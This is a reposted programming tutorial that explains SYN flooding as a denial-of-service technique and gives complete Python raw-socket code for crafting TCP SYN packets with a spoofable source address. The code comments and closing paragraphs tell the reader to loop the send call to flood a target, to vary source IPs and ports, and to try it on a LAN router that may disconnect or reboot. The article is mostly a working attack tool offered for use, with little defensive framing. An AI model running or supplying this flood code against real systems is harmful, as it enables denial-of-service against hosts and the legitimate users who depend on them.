> 转自 <http://www.binarytides.com/syn-flood-program-in-python-using-raw-sockets-linux/>

### Syn flood and raw sockets
***

A syn flood program sends out large number of tcp syn packets to a remote host on a particular port number. Syn packets are intended to initiate a tcp connection. However if a large number of syn packets are send without any purpose, then then it would consume a lot of resources like memory on the remote system. This concept is used in denial of service (dos) attacks. It is like jamming the networking path of a remote machine or device. This results in the device being unable to serve actual requests from legitimate users.

In this article we are going to write a very simple syn flood program in python. A syn flood program works by creating syn packets which need raw socket support. Linux has raw socket support natively and hence the program shown in this example shall work only on a linux system even though python itself is platform independant. This is because the underlying socket libraries are different on windows and linux.

### Code
***

The theory behind the code is quite simple. Just create a raw socket and a tcp syn packet and send the packet over the raw socket. That is all that needs to be done.

Here is the program

	'''
		Syn flood program in python using raw sockets (Linux)
		
		Silver Moon (m00n.silv3r@gmail.com)
	'''

	# some imports
	import socket, sys
	from struct import *

	# checksum functions needed for calculation checksum
	def checksum(msg):
		s = 0
		# loop taking 2 characters at a time
		for i in range(0, len(msg), 2):
			w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
			s = s + w
		
		s = (s>>16) + (s & 0xffff);
		#s = s + (s >> 16);
		#complement and mask to 4 byte short
		s = ~s & 0xffff
		
		return s

	#create a raw socket
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	except socket.error , msg:
		print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()

	# tell kernel not to put in headers, since we are providing it
	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
		
	# now start constructing the packet
	packet = '';

	source_ip = '192.168.1.101'
	dest_ip = '192.168.1.1'	# or socket.gethostbyname('www.google.com')

	# ip header fields
	ihl = 5
	version = 4
	tos = 0
	tot_len = 20 + 20	# python seems to correctly fill the total length, dont know how ??
	id = 54321	#Id of this packet
	frag_off = 0
	ttl = 255
	protocol = socket.IPPROTO_TCP
	check = 10	# python seems to correctly fill the checksum
	saddr = socket.inet_aton ( source_ip )	#Spoof the source ip address if you want to
	daddr = socket.inet_aton ( dest_ip )

	ihl_version = (version << 4) + ihl

	# the ! in the pack format string means network order
	ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

	# tcp header fields
	source = 1234	# source port
	dest = 80	# destination port
	seq = 0
	ack_seq = 0
	doff = 5	#4 bit field, size of tcp header, 5 * 4 = 20 bytes
	#tcp flags
	fin = 0
	syn = 1
	rst = 0
	psh = 0
	ack = 0
	urg = 0
	window = socket.htons (5840)	#	maximum allowed window size
	check = 0
	urg_ptr = 0

	offset_res = (doff << 4) + 0
	tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

	# the ! in the pack format string means network order
	tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)

	# pseudo header fields
	source_address = socket.inet_aton( source_ip )
	dest_address = socket.inet_aton(dest_ip)
	placeholder = 0
	protocol = socket.IPPROTO_TCP
	tcp_length = len(tcp_header)

	psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
	psh = psh + tcp_header;

	tcp_checksum = checksum(psh)

	# make the tcp header again and fill the correct checksum
	tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)

	# final full packet - syn packets dont have any data
	packet = ip_header + tcp_header

	#Send the packet finally - the port specified has no effect
	s.sendto(packet, (dest_ip , 0 ))	# put this in a loop if you want to flood the target

	#put the above line in a loop like while 1: if you want to flood

The above program has to be run with root privileges. Raw sockets need root privileges. On ubuntu prefix sudo when running the script.

	$ sudo python tcp_syn.py

Also note that if a firewall like firestarter is running then it might block the syn packets from being delivered. Use a packet sniffer like wireshark to check that the packet was generated and transmitted properly.

Many more things can be added to the above program. Put the sendto in a loop and it would send out huge number of syn packets, flooding the target system. Also try to change the source ip and source port in each packet in a loop. For this the pseudo header and tcp header checksum needs to be recalculated everytime.

The best thing to try this program on would be your LAN router. If might get disconnected or even restart itself if it is unable to handle a syn flood attack. 

